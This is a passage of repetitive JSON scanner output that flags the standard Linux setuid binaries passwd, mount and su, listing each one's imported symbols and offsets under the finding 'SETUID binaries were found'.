                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f2b0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f748",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f750",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000fc08",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000fc10",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010160",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010170",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010178",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010180",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010188",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x000101a0",
                        "stderr",
                        "SETUID binaries were found"
                     ]
                  ]
               }
            ],
            "info": "SETUID binaries were found",
            "details": [
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db40, Symbol: mnt_table_set_parser_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db48, Symbol: mnt_context_get_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db50, Symbol: mnt_fs_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db58, Symbol: mnt_context_set_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db60, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db68, Symbol: mnt_context_is_restricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db70, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db78, Symbol: mnt_unref_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db80, Symbol: mnt_fs_get_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db88, Symbol: mnt_context_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db90, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db98, Symbol: mnt_context_helper_executed, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dba0, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dba8, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbb0, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbb8, Symbol: secure_getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbc0, Symbol: mnt_fs_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbc8, Symbol: mnt_context_enable_fake, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbd0, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbd8, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbe0, Symbol: mnt_context_set_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbe8, Symbol: mnt_context_is_fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbf0, Symbol: strtod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbf8, Symbol: mnt_table_next_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc00, Symbol: localeconv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc08, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc10, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc18, Symbol: mnt_new_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc20, Symbol: mnt_context_get_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc28, Symbol: mnt_context_set_target_prefix, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc30, Symbol: mnt_context_disable_swapmatch, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc38, Symbol: __strtol_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc40, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc48, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc50, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc58, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc60, Symbol: mnt_get_library_features, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc68, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc70, Symbol: mnt_cache_find_tag_value, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc78, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc80, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc88, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc90, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc98, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dca0, Symbol: mnt_context_force_unrestricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dca8, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcb0, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcb8, Symbol: mnt_new_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcc0, Symbol: mnt_context_next_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcc8, Symbol: mnt_optstr_remove_option, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcd0, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcd8, Symbol: mnt_context_enable_rwonly_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dce0, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dce8, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcf0, Symbol: __strtoul_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcf8, Symbol: mnt_context_wait_for_children, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd00, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd08, Symbol: mnt_context_disable_helpers, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd10, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd18, Symbol: getcwd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd20, Symbol: mnt_context_get_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd28, Symbol: fgetc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd30, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd38, Symbol: mnt_context_set_tables_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd40, Symbol: pipe, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd48, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd50, Symbol: mnt_new_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd58, Symbol: mnt_context_next_remount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd60, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd68, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd70, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd78, Symbol: strndup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd80, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd88, Symbol: mnt_fs_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd90, Symbol: mnt_match_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd98, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dda0, Symbol: mnt_context_set_fstab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dda8, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddb0, Symbol: mnt_fs_get_srcpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddb8, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddc0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddc8, Symbol: mnt_context_is_nocanonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddd0, Symbol: prctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddd8, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dde0, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dde8, Symbol: mnt_context_enable_fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddf0, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddf8, Symbol: mnt_init_debug, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de00, Symbol: mnt_context_syscall_called, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de08, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de10, Symbol: mnt_context_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de18, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de20, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de28, Symbol: mnt_new_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de30, Symbol: mnt_context_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de38, Symbol: mnt_fs_is_pseudofs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de40, Symbol: mnt_context_get_excode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de48, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de50, Symbol: mnt_free_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de58, Symbol: mnt_context_is_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de60, Symbol: mnt_context_set_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de68, Symbol: mnt_unref_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de70, Symbol: mnt_fs_is_netfs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de78, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de80, Symbol: mnt_optstr_get_option, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de88, Symbol: mnt_context_enable_sloppy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de90, Symbol: mnt_table_set_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de98, Symbol: mnt_context_set_mflags, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dea0, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dea8, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000deb0, Symbol: mnt_context_get_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000deb8, Symbol: mnt_context_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dec0, Symbol: mnt_get_library_version, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dec8, Symbol: memmove, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ded0, Symbol: mnt_context_is_parent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ded8, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dee0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dee8, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000def0, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000def8, Symbol: mnt_pretty_path, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df00, Symbol: mnt_context_set_options_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df08, Symbol: mnt_free_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df10, Symbol: mnt_context_disable_canonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df18, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df20, Symbol: mnt_context_set_fstype_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df28, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df30, Symbol: mnt_context_append_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df38, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df40, Symbol: mnt_context_get_mflags, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df48, Symbol: fwrite, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df50, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df58, Symbol: mnt_context_enable_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df60, Symbol: mnt_context_set_optsmode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df68, Symbol: mnt_fs_get_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df70, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df78, Symbol: mnt_table_parse_fstab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df80, Symbol: mnt_context_disable_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df88, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df90, Symbol: mnt_tag_is_valid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df98, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfa0, Symbol: mnt_fs_set_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfa8, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfb0, Symbol: mnt_context_get_status, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfb8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfc0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfc8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfd0, Symbol: environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfd8, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfe0, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011b98, Symbol: endgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ba0, Symbol: getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ba8, Symbol: sigprocmask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bb0, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bb8, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bc0, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bc8, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bd0, Symbol: __vfprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bd8, Symbol: abort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011be0, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011be8, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bf0, Symbol: fdatasync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bf8, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c00, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c08, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c10, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c18, Symbol: pam_set_item, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c20, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c28, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c30, Symbol: isatty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c38, Symbol: sigaction, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c40, Symbol: strtod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c48, Symbol: localeconv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c50, Symbol: clock_gettime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c58, Symbol: setenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c60, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c68, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c70, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c78, Symbol: __strtol_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c80, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c88, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c90, Symbol: wait3, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c98, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ca0, Symbol: clearenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ca8, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cb0, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cb8, Symbol: pam_chauthtok, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cc0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cc8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cd0, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cd8, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
